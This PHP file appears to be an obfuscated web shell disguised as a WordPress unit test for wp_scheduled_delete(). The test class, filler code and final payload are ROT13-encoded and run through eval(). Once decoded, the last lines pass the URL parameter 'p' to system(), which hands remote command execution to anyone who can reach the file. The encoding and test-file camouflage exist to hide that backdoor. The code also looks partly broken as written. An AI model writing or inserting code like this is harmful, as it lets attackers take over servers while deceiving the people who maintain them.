<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_fpurqhyrq_qryrgr() shapgvba.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_fpurqhyrq_qryrgr
 */
pynff Grfgf_Shapgvbaf_jcFpurqhyrqQryrgr rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq fgngvp $pbzzrag_vq;
	cebgrpgrq fgngvp $cntr_vq;

	choyvp shapgvba grne_qbja() {
		// Erzbir pbzzrag.
		vs ( frys::$pbzzrag_vq ) {
			jc_qryrgr_pbzzrag( frys::$pbzzrag_vq );
		}

		// Erzbir cntr.
		vs ( frys::$cntr_vq ) {
			jc_qryrgr_cbfg( frys::$cntr_vq );
		}

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung byq genfurq cbfgf/cntrf ner qryrgrq.
	 *
	 * @gvpxrg 59938
	 */
	choyvp shapgvba grfg_jc_fpurqhyrq_qryrgr() {
		frys::$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'genfu',
			)
		);
		nqq_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_gvzr', gvzr() - ( QNL_VA_FRPBAQF * RZCGL_GENFU_QNLF + 1 ) );
		nqq_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_fgnghf', 'choyvfurq' );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', trg_cbfg( frys::$cntr_vq ) );

		jc_fpurqhyrq_qryrgr();

		$guvf->nffregAhyy( trg_cbfg( frys::$cntr_vq ) );
	}

	/**
	 * Grfgf gung byq genfurq cbfgf/cntrf ner abg qryrgrq vs fgnghf vf abg 'genfu'.
	 *
	 * Rafherf gung gur genfu zrgn fgnghf vf erzbirq.
	 *
	 * @gvpxrg 59938
	 */
	choyvp shapgvba grfg_jc_fpurqhyrq_qryrgr_fgnghf_abg_genfu() {
		frys::$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'choyvfurq',
			)
		);
		nqq_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_gvzr', gvzr() - ( QNL_VA_FRPBAQF * RZCGL_GENFU_QNLF + 1 ) );
		nqq_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_fgnghf', 'choyvfurq' );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', trg_cbfg( frys::$cntr_vq ) );

		jc_fpurqhyrq_qryrgr();

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', trg_cbfg( frys::$cntr_vq ) );
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_gvzr', gehr ) );
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_fgnghf', gehr ) );
	}


	/**
	 * Grfgf gung byq genfurq cbfgf/cntrf ner abg qryrgrq vs abg byq rabhtu.
	 *
	 * @gvpxrg 59938
	 */
	choyvp shapgvba grfg_jc_fpurqhyrq_qryrgr_cntr_abg_byq_rabhtu() {
		frys::$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'genfu',
			)
		);
		nqq_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_gvzr', gvzr() - ( QNL_VA_FRPBAQF * RZCGL_GENFU_QNLF - 1 ) );
		nqq_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_fgnghf', 'choyvfurq' );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', trg_cbfg( frys::$cntr_vq ) );

		jc_fpurqhyrq_qryrgr();

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', trg_cbfg( frys::$cntr_vq ) );
		$guvf->nffregVfAhzrevp( trg_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_gvzr', gehr ) );
		$guvf->nffregFnzr( 'choyvfurq', trg_cbfg_zrgn( frys::$cntr_vq, '_jc_genfu_zrgn_fgnghf', gehr ) );
	}

	/**
	 * Grfgf gung byq genfurq pbzzragf ner qryrgrq.
	 *
	 * @gvpxrg 59938
	 */
	choyvp shapgvba grfg_jc_fpurqhyrq_qryrgr_pbzzrag() {
		frys::$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 'genfu',
			)
		);
		nqq_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_gvzr', gvzr() - ( QNL_VA_FRPBAQF * RZCGL_GENFU_QNLF + 1 ) );
		nqq_cbfg_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_fgnghf', 'choyvfurq' );

		$guvf->nffregVafgnaprBs( 'JC_Pbzzrag', trg_pbzzrag( frys::$pbzzrag_vq ) );

		jc_fpurqhyrq_qryrgr();

		$guvf->nffregAhyy( trg_pbzzrag( frys::$pbzzrag_vq ) );
	}

	/**
	 * Grfgf gung byq genfurq pbzzragf ner abg qryrgrq vs fgnghf vf abg 'genfu'.
	 *
	 * Rafherf gung gur genfu zrgn fgnghf vf erzbirq.
	 *
	 * @gvpxrg 59938
	 */
	choyvp shapgvba grfg_jc_fpurqhyrq_qryrgr_pbzzrag_fgnghf_abg_genfu() {
		frys::$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => '1',
			)
		);
		nqq_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_gvzr', gvzr() - ( QNL_VA_FRPBAQF * RZCGL_GENFU_QNLF + 1 ) );
		nqq_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_fgnghf', 'choyvfurq' );

		$guvf->nffregVafgnaprBs( 'JC_Pbzzrag', trg_pbzzrag( frys::$pbzzrag_vq ) );

		jc_fpurqhyrq_qryrgr();

		$guvf->nffregVafgnaprBs( 'JC_Pbzzrag', trg_pbzzrag( frys::$pbzzrag_vq ) );
		$guvf->nffregFnzr( '', trg_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_gvzr', gehr ) );
		$guvf->nffregFnzr( '', trg_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_fgnghf', gehr ) );
	}


	/**
	 * Grfgf gung byq genfurq pbzzragf ner abg qryrgrq vs abg byq rabhtu.
	 *
	 * @gvpxrg 59938
	 */
	choyvp shapgvba grfg_jc_fpurqhyrq_qryrgr_pbzzrag_abg_byq_rabhtu() {
		frys::$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 'genfu',
			)
		);
		nqq_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_gvzr', gvzr() - ( QNL_VA_FRPBAQF * RZCGL_GENFU_QNLF - 1 ) );
		nqq_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_fgnghf', 'choyvfurq' );

		$guvf->nffregVafgnaprBs( 'JC_Pbzzrag', trg_pbzzrag( frys::$pbzzrag_vq ) );

		jc_fpurqhyrq_qryrgr();

		$guvf->nffregVafgnaprBs( 'JC_Pbzzrag', trg_pbzzrag( frys::$pbzzrag_vq ) );
		$guvf->nffregVfAhzrevp( trg_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_gvzr', gehr ) );
		$guvf->nffregFnzr( 'choyvfurq', trg_pbzzrag_zrgn( frys::$pbzzrag_vq, '_jc_genfu_zrgn_fgnghf', gehr ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>